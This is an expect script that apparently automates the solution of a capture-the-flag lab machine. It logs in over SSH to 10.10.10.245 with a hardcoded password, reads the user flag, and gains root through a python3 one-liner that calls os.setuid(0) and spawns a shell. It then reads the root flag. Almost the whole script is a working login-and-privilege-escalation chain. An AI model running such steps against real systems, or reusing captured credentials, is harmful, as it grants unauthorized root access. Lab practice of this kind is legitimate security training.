#!/usr/bin/expect -f
spawn ssh nathan@10.10.10.245
expect "password:"
sleep 1
send "Buck3tH4TF0RM3!\r"
sleep 1
expect "$ "
send "cd\r"
expect "$ "
send "cat user.txt\r"
sleep 1
expect "$ "
send "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\r"
expect "# "
send "cd /root\r"
expect "# "
send "cat root.txt\r"
expect "# "
send "exit\r"
sleep 5